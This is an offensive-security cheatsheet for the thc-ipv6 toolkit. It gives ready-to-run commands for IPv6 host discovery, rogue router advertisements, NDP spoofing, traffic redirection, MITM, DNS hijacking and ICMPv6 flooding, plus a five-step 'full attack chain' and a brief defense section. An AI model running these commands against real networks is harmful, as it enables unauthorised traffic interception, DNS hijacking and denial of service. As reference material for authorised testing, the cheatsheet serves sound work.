---
title: "thc-ipv6 Cheatsheet"
description: "Quick reference for thc-ipv6 IPv6 attack and discovery tools"
mitre_tactic: discovery
mitre_tactic_id: TA0007
mitre_subcategory: remote_system_discovery
tags:
  - ipv6
  - neighbor-discovery
  - cheatsheet
  - mitm
---

# thc-ipv6 Cheatsheet

## Quick Start

```bash
# Discover IPv6 hosts
sudo discover6 eth0

# Passive discovery
sudo passive_discovery6 eth0

# List all tools
thc-ipv6 --help
```

## Common Tools

| Tool | Description | Command |
|------|-------------|---------|
| `discover6` | Host discovery | `sudo discover6 eth0` |
| `fake_router6` | Rogue router | `sudo fake_router6 eth0 2001:db8::1` |
| `redir6` | Traffic redirect | `sudo redir6 eth0 victim_mac fake_mac` |
| `parasite6` | NDP spoofing | `sudo parasite6 eth0` |
| `mitm6` | MITM via IPv6 | `sudo mitm6 eth0` |
| `doser6` | ICMPv6 flood | `sudo doser6 eth0 target` |
| `dns6` | DNS manipulation | `sudo dns6 eth0` |
| `dump_dhcp6` | Capture DHCPv6 | `sudo dump_dhcp6 eth0` |
| `passive_discovery6` | Passive NDP | `sudo passive_discovery6 eth0` |
| `flood_router6` | RA flood | `sudo flood_router6 eth0` |
| `flood_neighbor6` | NS flood | `sudo flood_neighbor6 eth0 target` |
| `coverage6` | Check coverage | `sudo coverage6 eth0 2001:db8::/32` |

## Host Discovery

```bash
# Active discovery
sudo discover6 eth0

# Passive discovery
sudo passive_discovery6 eth0

# Capture DHCPv6
sudo dump_dhcp6 eth0

# Check IPv6 coverage
sudo coverage6 eth0 2001:db8::/32
```

## Examples

**Discover hosts:**
```bash
sudo discover6 eth0
```

**Rogue router:**
```bash
sudo fake_router6 eth0 2001:db8:evil::1
```

**MITM attack:**
```bash
sudo mitm6 eth0
```

**DNS manipulation:**
```bash
sudo dns6 eth0
```

**DoS testing:**
```bash
sudo doser6 eth0 fe80::1%eth0
```

## Chaining

```bash
# Full attack chain
sudo discover6 eth0                          # 1. Find hosts
sudo passive_discovery6 eth0 -v              # 2. Learn addresses
sudo fake_router6 eth0 2001:db8:evil::1      # 3. Rogue router
sudo dns6 eth0                               # 4. Hijack DNS
sudo redir6 eth0 victim_mac attacker_mac     # 5. Redirect

# thc-ipv6 + tcpdump
sudo tcpdump -i eth0 icmp6 -w ipv6.pcap &
sudo fake_router6 eth0 2001:db8:evil::1

# thc-ipv6 + ndisc6
sudo discover6 eth0
ndisc6 -1 fe80::1%eth0
```

## Troubleshooting

| Problem | Fix |
|---------|-----|
| "No IPv6 address" | Add: `sudo ip -6 addr add 2001:db8::1/64 dev eth0` |
| "No such device" | Check: `ip -br link show` |
| "Permission denied" | Use `sudo` |
| No hosts found | Enable IPv6: `sysctl net.ipv6.conf.all.disable_ipv6=0` |
| Slow discovery | Adjust delay: `-d 100` |
| IPv6 disabled | `sudo sysctl -w net.ipv6.conf.all.disable_ipv6=0` |

## Defense Reference

```bash
# Disable IPv6
sudo sysctl -w net.ipv6.conf.all.disable_ipv6=1

# Block RA
sudo ip6tables -A INPUT -p icmpv6 --icmpv6-type 134 -i eth1 -j DROP

# Static NDP
sudo ip -6 neigh add fe80::1 lladdr 08:00:27:a1:b2:c3 dev eth0
```
